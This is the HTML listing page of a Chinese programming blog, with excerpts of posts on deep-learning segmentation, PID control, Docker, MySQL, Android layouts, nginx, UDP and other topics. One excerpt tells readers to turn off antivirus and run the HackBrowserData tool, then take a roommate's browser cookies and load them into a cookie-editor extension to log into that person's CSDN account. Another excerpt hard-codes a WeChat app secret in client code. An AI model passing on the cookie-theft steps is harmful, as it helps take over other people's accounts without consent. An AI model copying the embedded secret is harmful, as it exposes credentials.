<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e11ec03a7e1513209d938b78bf4ccaea/" rel="bookmark">
			Swin UNETR: Swin Transformers for Semantic Segmentation of Brain Tumors in MRI Images
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要 卷积神经网络因为其卷积核的固有属性，其在远程建模方面存在着较大的问题。这可能导致对可变大小的肿瘤进行分割时存在不足。另一方面，Transformer在多个领域在捕获远程依赖信息方面表现出了出色的能力。
本文提出了一个新的分割模型,称为Swin UNETR，具体来说，3D脑肿瘤语义分割被重新定义为一个序列到序列的预测问题，其中多模态输入数据被投影到一个1D嵌入序列当中，并用作分层Swin Transformer的输入作为编码器。Swin Transformer编码器利用移位窗口计算自注意力，以5种不同分辨率提取特征，并通过跳跃连接在每个分辨率上连接到基于FCNN的解码器。
在本文中提出的网络称为Swin UNETR结构。它利用一个带有Swin Transformer的U型网络作为编码器，并通过跳跃连接将其以不同分辨率连接到基于CNN的编器
Swin UNETR网络结构 网络结构如下图所示：
编码器 模型的输入X是一个分辨率为（H',W',D'）尺寸为H'*W'*D'*S的Token。首先利用一个个Patch创建一个尺寸为3D Token并将其投影到维度为C的嵌入空间中。
具体来说，利用大小为M*M*M的窗口，在Transformer编码器给定层l处，将3D Token均匀的划分为
区域。随后在l+1层中，分区的窗口域位移为体素，在随后的l层和l+1层，输出计算公式记为
Swin UNETR的编码器有4级，每级包含两个Transformer块。因此编码器中总层数为L=8。
解码器 在解码器使用上采样不断恢复图像的分辨率，最终通过一个1*1*1卷积层和Sigmod激活函数计算出最终的分割预测结果。
损失函数 在本文中使用Soft Dice loss，它以体素方式进行计算，公式如下：
总结 本文提出的Swin UNETR,它是一种利用多模态MRI图像的对脑肿瘤进行语义分割的新架构，其具有U型的网络结构，它使用Swin Transformer作为编码器，使用基于CNN的解码器，通过不同分辨率的跳跃连接连接到编码器。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac31234a3d8ac3ae67d00bf5144d5f6a/" rel="bookmark">
			电机控制——PID参数理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、电机控制所需要的 PID 参数 电机控制，以个人经验来看，不论是双环速度环还是三环位置环，都只需要 P 和 I 两个参数，并不需要 D。
2、P 参数 P r o p o r t i o n n . 部分；份额；比例 Proportion \quad n. \quad 部分；份额；比例 Proportionn.部分；份额；比例
比例系数 P，比例系数是个实时响应的参数，改变 P 能够马上从系统响应上体现出来。例如增大比例系数P能使系统反应灵敏，调节速度加快，并且可以减小稳态误差。但是比例系数过大会使超调量增大，震荡次数增加，调节时间加长，动态性能变坏，比例系数太大甚至会使闭环系统不稳定。
只使用比例调节，系统一定会存在静差。结合直流电机调速系统分析，随着误差的减小，控制器的输出逐渐减小，当小到一定的程度后已经无法再通过提高pid控制器的输出(电机的控制输入如电压、 k p ∗ e k_p*e kp​∗e)来提高转速从而使目标转速和实际转速间的误差继续减小了，因为总要克服阻力做工的嘛，误差为零的时候电机没有能量输入，所以当然无法克服阻力做工。因此，虽然检测到误差，但是误差太小了，导致控制器输出值也太小了，已经无力让速度继续增加至目标速度，从而达到了有差平衡。这种现象在负载变大后尤其明显，负载增加后静差也会变大。想象一下，当前 k p ∗ e k_p*e kp​∗e能驱动当前负载，当负载增大，想要继续匀速运行，就算根据能量守恒也能推断出 e e e增大才能再次匀速。所以纯比例肯定会有静差的。
3、I 参数 I n t e g r a t i o n n . 整合；融合； ( 数 ) 积分 Integration \quad n.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac31234a3d8ac3ae67d00bf5144d5f6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bbbaaf08f50bd7469aaa5f88e780e30/" rel="bookmark">
			【C#】CefSharp 播放视频,Video
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		General Usage · cefsharp/CefSharp Wiki · GitHub
public partial class VideoTest : Form { ChromiumWebBrowser chromiumWebBrowser; public VideoTest() { InitializeComponent(); string url = "https://haokan.baidu.com/v?vid=10884618164776380032&amp;tab=recommend&amp;sfrom=recommend"; chromiumWebBrowser = new ChromiumWebBrowser(url);//浏览网址https://kyfw.12306.cn chromiumWebBrowser.Dock = DockStyle.Fill; chromiumWebBrowser.Show(); chromiumWebBrowser.Parent = this; } } 下载地址：
https://download.csdn.net/download/chenxiaotao22/86742860
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42a87215308c266d3e333c751714795f/" rel="bookmark">
			微信小程序获取用户openid
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现点击按钮获取到用户的openid
效果：
&lt;van-button type="default" bindtap="userin" block&gt;获取用户openid&lt;/van-button&gt; userin() { //获取用户的一些信息 wx.getUserInfo({ success: (res) =&gt; { } }); //获取用户code值 wx.login({ success: (res) =&gt; { let code = res.code //把我们获取到的code值用变量储存起来换取openid的时候需要把这个变量带上 // 通过wx.request 来让code换取openid wx.request({ url: `https://api.weixin.qq.com/sns/jscode2session?appid=wxa0730ad5f23ba160&amp;secret=b1b067821d3f00b9a137579fcc3fa4f9&amp;js_code=${code}&amp;grant_type=authorization_code`, success: (res) =&gt; { var openid = res.data.openid console.log(openid,"用户的openid"); } }) } }) } 每个人的id都不一样要自己去作修改 登录微信公众平台 =&gt;开发管理=&gt;开发设置=&gt;开发者Id
将小程序开发者工具中的不校验https合法域名给勾选上
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0734692281199616b68614878e2abd62/" rel="bookmark">
			Docker Swarm搭建Overlay网络，实现跨主机通信的排坑记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 这只是一个排坑记录，注意，我非常不建议你继续阅读下去，非局域网搭建overlay完全是吃力不讨好的行为，是个于我而言难以完成的目标
非局域网间使用swarm配置overlay进行容器通信的坑实在太多了，排到最后也没有排干净，放弃了，如果对排坑过程感兴趣，或者你也想实践一下在非局域网间自己搭建一个“局域网”（bushi），请继续阅读吧
另外，对于跨域搭建集群感兴趣的，可以移步我的另一篇博客Java微服务多主机搭建尝试
Step1. 创建overlay虚拟网络 本步骤将Server1和Server2置于同一虚拟网络下，这样才可以进行集群的搭建，下面这篇博客对于swarm的使用技巧总结得十分到位：
Docker搭建Swarm跨主机overlay网络
但需要更正一点，Server2在指定为worker节点时，通过docker network ls是无法看到overlay网络的
这是因为docker的特性所决定的，worker节点没有启动服务的权限，只能通过manager节点指定，因此worker节点也没有直接共享manager的overlay网络的必要，只有在manager在worker节点启动一个服务，并指定服务运行的网络时，worker节点才可以获得对应网络的信息。例如，进行下面的实验
在Server1通过docker stack deploy启动一组服务，其中db服务运行在manager网络，db2服务运行在worker网络 [root@homeforzhu ~]# docker stack deploy -c stack.yml [service_name] # stack.yml # Use root/example as user/password credentials version: '3.1' services: db: image: mysql:5.7.25 # NOTE: use of "mysql_native_password" is not recommended: https://dev.mysql.com/doc/refman/8.0/en/upgrading-from-previous-series.html#upgrade-caching-sha2-password # (this is just an example, not intended to be a production configuration) command: --default-authentication-plugin=mysql_native_password restart: always ports: - "3307:3306" environment: MYSQL_ROOT_PASSWORD: root deploy: replicas: 1 placement: constraints: - node.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0734692281199616b68614878e2abd62/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/999ea414c863786dfef510a611c9b587/" rel="bookmark">
			C语言continue和break的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1）break
break的作用为立即退出本层循环。
break只能用于循环体和switch，除这两种情况外，不能用于任何其他语句中。
break只能跳出一层循环。当有多层循环嵌套的时候，break只能跳出“包裹”它的最里面的那一层循环，无法一次跳出所有循环。
break的作用很简单，这里不再上代码演示。
2）continue
与break不同，continue是结束本次循环。本次循环体内不执行 continue语句后的其它语句，但下一次循环还会继续执行。
并且continue只能在循环语句中使用，不能在switch中使用。
上代码
代码1
int main()
{
int i = 1;
while (i &lt;= 10)
{
if (i == 5)
{
continue;
}
printf("%d",i);
i++;
}
return 0;
}
经调试，输出结果为1234，并陷入了死循环。
代码2
int main()
{
int i = 0;
while (i &lt; 10)
{
i++;
if (i == 5)
{
continue;
}
printf("%d",i);
}
return 0;
}
经调试，输出结果为1234678910
可以发现，本次循环中continue后边的代码都不会再执行，而是直接跳转到判断部分。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d09472a516b5972f3774be8743d25242/" rel="bookmark">
			（三）爬取一些网页图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		爬取一些网页图片 1、随机爬取一个网页： import requests # 1、获取图片网页源码 def Get_Source_Page(): url = 'https://pic.netbian.com/index.html' # 当爬虫程序运行爬网站，若不设置header为任意一个名字，会被有些网站检查出是python爬虫，被禁止访问 headers = { # 'Host':'image.baidu.com' # 'Cookie': # 'Referer': "User-Agent": "hdy" } # 后去网页get请求 response = requests.get(url=url, headers=headers) # 获取数据内容，并打印（获取网页源码很重要，每个网页都不尽相同，可以根据具体返回的网页信息来截取图片信息） text = response.text print(text) return text if __name__=='__main__': Get_Source_Page() 2、运行，出现部分乱码： 3、将返回的网页进行编码解码，具体什么编码看开头的“meta charset="gbk“，这里是gbk编码。 response.encoding = 'gbk' 4、完整代码： import requests # 1、获取图片网页源码 def Get_Source_Page(): url = 'https://pic.netbian.com/index.html' # 当爬虫程序运行爬网站，若不设置header为任意一个名字，会被有些网站检查出是python爬虫，被禁止访问 headers = { # 'Host':'image.baidu.com' # 'Cookie': # 'Referer': "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d09472a516b5972f3774be8743d25242/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cfe2c5f7cb4f99be7d70f70c651c528/" rel="bookmark">
			MySQL RR 与 幻读问题（实验 &#43; 案例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 本文围绕这三个话题展开学习 RR 如何解决幻读？
MVCC 原理实验：RR 与 幻读案例：死锁 先来回顾下 MySQL中 InnoDB 支持的四种事务隔离 和 并发事务所带来的一些问题：
读未提交：能读到一个事务的中间过程，违背了 ACID 特性，存在脏读的问题，基本不会用到。读提交：表示如果其他事务已经提交，那么就可以看到。在生产环境中用的并不多。可重复读：默认级别，使用最多的一种。其特点是有 Gap 锁（间隙锁）。可串行化：所有的实现都是通过锁来实现的。 并发事务处理也会带来一些问题：脏读、不可重复读、幻读
脏读：一个事务正在对一条记录做修改，在这个事务完成并提交前，这条记录的数据就处于不一致状态。
不可重复读：一个事务按相同查询条件前后两次读取，读出的数据不一致（修改、删除）。
幻读：一个事务内按相同的查询条件重新查询数据，却发现其他事务插入了满足其查询条件的新数据。
本文脉络梳理： RR 为了更快并发，引入 MVCC，但有幻读的可能，为解决幻读，引入 Gap 锁，Gap 可能造成死锁。
二、MVCC 原理 MVCC（多版本控制）： 指数据库中为了实现高并发的数据访问，对数据进行多版本处理，并通过事务的可见性来保证事务能看到自己应该看到的数据版本。
MVCC 最大的好处是读不加锁，读写不冲突。在 OLTP (On-Line Transaction Processing)应用中，读写不冲突很重要，几乎所有 RDBMS 都支持 MVCC。 注意：MVCC 只在 读提交RC 和 可重复读RR 两种隔离级别下工作。 注意：MVCC 只在 读提交RC 和 可重复读RR 两种隔离级别下工作。 注意：MVCC 只在 读提交RC 和 可重复读RR 两种隔离级别下工作。
（1）MVCC 多版本实现 MySQL 实现 MVCC 机制的时候，是基于 undo log 多版本链条 + ReadView 机制。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8cfe2c5f7cb4f99be7d70f70c651c528/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88ee8c7aa5653695bf9e70fcdc07eb56/" rel="bookmark">
			ConstraintLayout 引导线 Guideline 约束 ( 简介 | 可视化操作 | 属性 | 水平引导线 | 垂直引导线 | 开始结束尺寸 | 百分比位置 | 约束组件 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录
I . Guideline 引导线 总结
II . Guideline 引导线 简介
III . Guideline 引导线 可视化操作
IV . Guideline 引导线 属性
V . Guideline 引导线 位置定义 方式切换
VI . Guideline 引导线 约束 其它组件
VII . Guideline 代码示例
I . Guideline 引导线 总结
1 . Guideline 引导线 属性 :
① 方向属性 : android:orientation=“horizontal” ; 取值 horizontal / vertical ;
② 开始尺寸定义 : app:layout_constraintGuide_begin=“22dp” ; 取值 dp 尺寸值 ; 距离 顶部 ( 水平 ) , 左侧 ( 垂直 ) 位置 ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88ee8c7aa5653695bf9e70fcdc07eb56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b04a9929a8f8dc95a1a01e69b9a8acd0/" rel="bookmark">
			初识ConstraintLayout之参照线（Guidelines）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		熟悉图形设计工具的设计人员可能对参照线并不陌生，但对于不是从事设计的人来说它可能有点陌生。一个参照线就是一个用来对齐其他视图且运行时隐藏的参照视图。这是一个抽象概念，但是一旦了解了它工作原理，那对于以后的布局将非常有用。Material Design推荐使用keylines。本篇文章学习如何通过参照线来快速实现这些。
参照线有水平和垂直之分。本篇文章将重点关注垂直参照线，但同时水平参照线的概念也与此相差无二。
创建一条参照线
要创建一个垂直参照线，我们可以通过右键点击蓝色视图并从上下文菜单中选择Helpers –&gt; Add Vertical Guideline：
如果你创建参照线后无法看到，只需点击蓝色视图的任意位置即可看到它。
参照线的类型
参照线有三种不同的类型，默认的类型就是：参照线将于父布局(ConstraintLayout)的起始边缘有着固定的偏移量(单位为dp)。我们刚刚参加的垂直参照线与起始边缘的偏移量就为20dp，注意这里我们指的是起始边缘(start)而不是左边缘(left)，因为对于从右向左的布局设置来说这是一个很好的用法。
第二种类型就是：参照线偏离end边缘；最后一种类型就是：根据父组件ConstraintLayout的宽度百分比来放置，在参照线边缘有个显示类型的指示器，我们可以通过重复点击这循环切换类型：
左偏移和右偏移对于设置keylines是非常有用的，而百分比形式的参照线则提供了类似于PercentLayout的一些功能。
调整参照线
一旦我们创建好了参照线，我们可以通过拖动线条来调整其位置(而不是拖动类型指示器)：
使用参照线
到了现在，我们知道了如何创建不同类型的参照线并调整其位置，那我们还可以做些什么呢？
我们可以使用它了作为任何View视图的约束参照物，换句话来说，我们可以在布局中任何View视图的锚点上创建一个约束并将其与参照线对齐，如果移动参照线，View也将随之跟着移动：
该示例中参照线仅限制了单个视图，但如果参照线要对更多的视图进行限制，那通过移动参照线将导致所有的视图都随之移动。
参照线的原理
Guideline类实际上是View的子类，它的onDraw()方法为空方法，并且固定为View.GONE，应用运行的时候它将无法显示出来，但在布局阶段，它将显示出来，我们可以用它来对齐其它的View。所以参照线是一个非常轻量的组件：用户是无法看见它的，但我们却可以在布局中用它来参考位置。
在XML中创建参照线
xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent"&gt; android:layout_width="wrap_content" android:layout_height="wrap_content" android:id="@+id/guideline1" android:orientation="vertical" app:layout_constraintGuide_begin="41dp"/&gt; android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Hello World !" android:layout_marginTop="16dp" app:layout_constraintTop_toTopOf="parent" app:layout_constraintStart_toStartOf="@+id/guideline1" android:layout_marginStart="8dp"/&gt; 从上可看出：有一个app:orientation="vertical"显然声明了一个垂直参照线，app:layout_constraintGuide_begin="41dp"表示参照线离父布局ConstraintLayout的起始位置为41dp，再次声明，是start而不是left。app:layout_constraintGuide_end=""表示相对于右边缘的距离，对于百分比参照线来说，使用app:layout_constraintGuide_percent="0.5"来描述百分比的偏移量。
从上面我们已经知道了参照线本身也是一个View，所以我们可以像TextView一样来向参照线添加约束。
转自：android创建Guideline,初识ConstraintLayout之参照线（Guidelines）_大妈手别抖的博客-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c04b325eccf997bff3e24fb321069ce/" rel="bookmark">
			HackBrowserData教你如何在室友面前装x
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HackBrowserData教你如何在室友面前装x HackBrowserData 一款浏览器数据导出工具。能够导出本地浏览器的密码、历史记录、Cookie、书签、下载记录、localStorage 等数据的命令行工具，支持多平台下的多种主流浏览器。
项目地址:https://github.com/moonD4rk/HackBrowserData
可以想象获取到我们平时使用的本地浏览器的密码、历史记录、Cookie、书签、下载记录、localStorage 无疑你就掌握了室友(朋友)各种信息,这得多危险!!!该开源项目只供学习参考,切勿用于商业或违法行为
安装 根据自己的系统选择安装的文件,笔者是win10,64位,所以安装如上图所示
注意事项 该exe可能会被杀毒软件检测为病毒,所以建议先将杀毒软件关闭在下载,解压后会有一个这样的hack-browser-data.exe
基本使用 目前我先获取一下我比较常用的edge浏览器的相关信息
随便查看了一下我浏览器记住的密码,完美获取到我保存的信息,太恐怖了!!!
装x时刻 里面既然有cookie相关的东西,那我们可以尝试着从室友那里获取到的cookie去登录csdn😏😏😏
前提 修改数据格式如果你认为比较麻烦的话,在文章的末尾我会提供一个新版的exe的,新版的exe会将数据提前处理好,开箱即用
第一步替换列名 这里为什么要用替换列名,因为目前的列名不符合等下要用到的工具的规范,将下面列名替换成如下图所示
第二步删除不必要字段 createDate和ExpireDate删除掉
第三步筛选出csdn相关的cookie 新建一个cookie.csv,将筛选出来的数据导进去
第四步将数据转换成json csv转json的网站:https://tableconvert.com/csv-to-json
第五步修改不规范的数据 替换掉所有**“FALSE”**为false
替换掉所有**“True”**为true
第六步下载浏览器插件Cookie Edit(要翻墙,文章最后会提供下载链接,edge无需翻墙) 第七步复制cookie到插件中 先进入到csdn的官网中
https://blog.csdn.net/
资源获取 关注公众号----&gt;爱上开源获取作者修改版的HackBrowserData及cookie-editor插件crx文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5adce23b1ed455796e62a200e2b23c94/" rel="bookmark">
			浪漫的七夕表白简单代码（简单的小代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		七夕来袭！是时候展现专属于程序员的浪漫了！你打算怎么给心爱的人表达爱意？鲜花礼物？代码表白？还是创意DIY？或者…无论那种形式，快来秀我们一脸吧！
目录
创意代码表白
代码
创意代码表白 以程序员的方式撒狗粮，专业浪漫，值得拥有！
运行效果:
代码： import turtle
def curvemove():
for i in range(200):
turtle.right(1)
turtle.forward(1)
turtle.color('blue')
turtle.begin_fill()
turtle.left(140)
turtle.forward(111.65)
curvemove()
turtle.left(120)
curvemove()
turtle.forward(111.65)
turtle.end_fill()
turtle.penup()
turtle.goto(-40, -50)
turtle.pendown()
turtle.write('I LOVE YOU', font = ('SimHei', 15, 'bold'))
turtle.hideturtle()
x = input()
import turtle def curvemove(): for i in range(200): turtle.right(1) turtle.forward(1) turtle.color('blue') turtle.begin_fill() turtle.left(140) turtle.forward(111.65) curvemove() turtle.left(120) curvemove() turtle.forward(111.65) turtle.end_fill() turtle.penup() turtle.goto(-40, -50) turtle.pendown() turtle.write('I LOVE YOU', font = ('SimHei', 15, 'bold')) turtle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5adce23b1ed455796e62a200e2b23c94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dea8d28555271be251ca14e116ec0c09/" rel="bookmark">
			目标检测yolo格式与labelme标注互相转换及其可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		yolo目标检测数据采用矩形框进行标注，其标注格式为[cls_id xp yp wp hp]，cls_id表示目标所属的类别序号。xp、yp表示目标中心点相对坐标，其中xp等于目标的绝对横坐标除以图像宽度，yp等于目标的绝对纵坐标除以图像高度。wp和hp表示目标的相对宽度和高度，其中wp等于目标的绝对宽度除以图像宽度，hp等于目标的绝对高度除以图像高度。每张图片的标注结果以txt文本文件存储，每一行[cls_id xp yp wp hp]表示一个目标。
cv_img=cv2.imdecode(np.fromfile(imagePath,dtype=np.uint8),flags=cv2.IMREAD_COLOR)
labelme矩形目标的标注格式为[x1 y1 x2 y2]，表示目标的左上和右下的绝对坐标。
1 yolo转labelme yolo转labelme标注程序如下所示：
# -*- coding: utf-8 -*- """ Created on Tue Mar 29 17:42:11 2022 @author: https://blog.csdn.net/suiyingy?type=blog """ import cv2 import os import json import shutil import numpy as np from pathlib import Path id2cls = {0:'pig'} def xyxy2labelme(labels, w, h, image_path, save_dir='res/'): save_dir = str(Path(save_dir)) + '/' if not os.path.exists(save_dir): os.makedirs(save_dir) label_dict = {} label_dict['version'] = '5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dea8d28555271be251ca14e116ec0c09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee9ea19544e0904316d786f49cbbfca9/" rel="bookmark">
			【Windows Server 2019】DNS服务器的配置与管理——安装DNS服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 5. 安装DNS服务5.1 实验环境5.2 配置服务器的IP地址5.3 安装 DNS 服务 参考资料关联博文 5. 安装DNS服务 5.1 实验环境 5.2 配置服务器的IP地址 5.3 安装 DNS 服务 （1）打开【服务器管理器】，单击【添加角色和功能】。
（2）系统首先会提示，在安装之前需要完成的任务。
（3）进入【选择安装类型】 界面， 使用默认选项【基于角色或基于功能的安装】。
（4）进入【选择目标服务器】界面， 选择【从服务器池中选择服务器】， 选择当前服务器。
（5）进入【选择服务器角色】 界面， 单击【DNS服务器】前面的复选框 。
（6）自动弹出【添加DNS服务器所需的功能】界面， 单击【添加功能】。
（7）返回【选择服务器角色】 界面， 确保勾选了【DNS服务器】。
（8）进入【选择功能】界面， 不需要再添加额外的功能，保持默认选择。
（9）进入【DNS服务器】界面， 该界面用于说明DNS服务器的作用及注意事项。
（10）进入【确认安装所选内容】界面， 显示出前面所选择要安装的内容。
（11）进入【安装进度】界面， 安装过程需要等待一段时间， 安装完成后， 会在进度条下面显示【已在Server上安装成功】。
（12）返回【服务器管理器·仪表板】界面，可以看到DNS服务已经成功安装。
参考资料 Microsoft Docs：Domain Name System (DNS)
关联博文 关于 DNS 服务的配置与管理 请看接下来的博文：
1: DNS 理论
2: 安装 DNS 服务
3: 配置 DNS 正向解析
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee9ea19544e0904316d786f49cbbfca9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70e505829c13d93df2b893f88c3241f7/" rel="bookmark">
			nginx学习（一）-windows
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nginx定义网上自己找，直接实操
windows操作nginx命令：在nginx目录下使用cmd打开命令窗口
nginx启动命令：start nginx或者nginx.exe
nginx停止命令：nginx.exe -s stop或者nginx.exe -s quit
nginx重启命令：nginx.exe -s reload
查看nginx的状态： nginx -t
查看nginx的版本：nginx -v
查看windows的配置文件：可以看到默认监听端口80
启动nginx之后使用：http://localhost:80查看nginx是否启动
打开配置文件，将nginx的的监听端口改变:
配置文件改变，重新启动nginx nginx配置文件详解：从大到小
nginx主要分为三个部分：全局块，events块，https块，将默认的配置文件中的#内容去掉剩下部分如下：
全局块：就是配置文件从头开始到events块之间的内容，主要设置的是影响nginx服务器整体运行的配置指令比如worker_process，值越大，可以支持的并发处理量也越多，但是还是和服务器的硬件相关
events 块：涉及的指令主要影响 Nginx 服务器与用户的网络连接，常用的设置包括是否开启对多 work process下的网络连接进行序列化，是否允许同时接收多个网络连接，选取哪种事件驱动模型来处理连接请求，每个 word process 可以同时支持的最大连接数等。
worker_processes，工作进程数
1.默认：worker_processes: 1
2.调大：worker_processes: CPU核心数，(双核4线程，可以设置为4)
worker_connections，单个工作进程可以允许同时建立外部连接的数量
数字越大，能同时处理的连接越多
1.默认：worker_connections: 1024
2.调大：worker_connections: 100000，（调大到10万连接）(不可以随意调节，与内存以及操作系统以及进程等有关，一般使用默认)
http块：nginx基本使用的重点:包括http全局块，以及多个server块
http 全局块配置的指令包括文件引入、 MIME-TYPE 定义、日志自定义、连接超时时间、单链接请求数上限等。
server块：这块和虚拟主机有密切关系，虚拟主机从用户角度看，和一台独立的硬件主机是完全一样的，该技术的产生是为了节省互联网服务器硬件成本。
每个 http 块可以包括多个 server 块，而每个 server 块就相当于一个虚拟主机
而每个 server 块也分为全局 server 块，以及可以同时包含多个 location 块
server全局块：最常见的就是配置本虚拟机监听配置和本虚拟机的名称以及ip配置
配置文件含义请访问：nginx.conf · huangzheng/file - 码云 - 开源中国 (gitee.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70e505829c13d93df2b893f88c3241f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6fa6f759f49a9b1d8424c0c6498131f/" rel="bookmark">
			python网络编程—UDP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、UDP协议特点： UDP是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。UDP传输数据时有大小限制，每个被传输的数据报必须限定在64KB之内。UDP是一个不可靠的协议，发送方所发送的数据报并不—定以相同的次序到达接收方。
二、实用情况 UDP是面向消息的协议，通信时不需要建立连接，数据的传输自然是不可靠的，UDP一般用于多点通信和实时的数据业务，比如
语音广播
视频
QQ
TFTP(简单文件传送)
大型网络游戏
相比于TCP注重速度流畅
三、代码实现UDP协议客户端与服务端通信 服务器端：
from socket import * # UDP客户端、创建一个服务器端的Socket socket_server = socket(AF_INET, SOCK_DGRAM) # 2、定义服务器端的ip地址和端口号，元组形式 host_port = ('192.168.108.43', 8090) # 3、服务器端的Socket来绑定地址和端口,只有绑定了地址和端口，才能称为服务器的Socket socket_server.bind(host_port) # 4、接收客户端发送过来的数据,每次接收1kb的数据，如果一直没收到数据会阻塞 # 收到的每一个数据报，里面是一个元组，第一个值是数据内容，第二个值是源地址 data = socket_server.recvfrom(1024) # 解码 print(data[0].decode('utf-8')) print(data) # 5、关闭套接字、释放资源 socket_server.close() 服务器端的结构:
(1) 使用函数socket()，生成套接字描述符;
(2) 通过host_post 结构设置服务器地址和监听端口;
(3）使用bind()函数绑定监听端口，将套接字文件描述符和地址类型变量(host_post)进行绑定;
(4）接收客户端的数据，使用recvfrom()函数接收客户端的网络数据;
(5）关闭套接字，使用close()函数释放资源;
客户端：
from socket import * # 客户端发送一个请求也需要端口，端口是随机分配的 # 创建一个UDP协议的套接字，然后发送一条数据到网络上的另外一个进程 # UDP客户端、创建套接字 client_socket = socket(AF_INET, SOCK_DGRAM) # SOCK_DGRAM:UDP协议 # 2、定义一个接收消息的目标,8080是一个目标服务器的端口，127.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6fa6f759f49a9b1d8424c0c6498131f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30aae78d3be385779309289e6147980d/" rel="bookmark">
			分布式事务常见解决方案整理：二阶段、三阶段、TCC、MQ&#43;本地事务&#43;消息校对
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
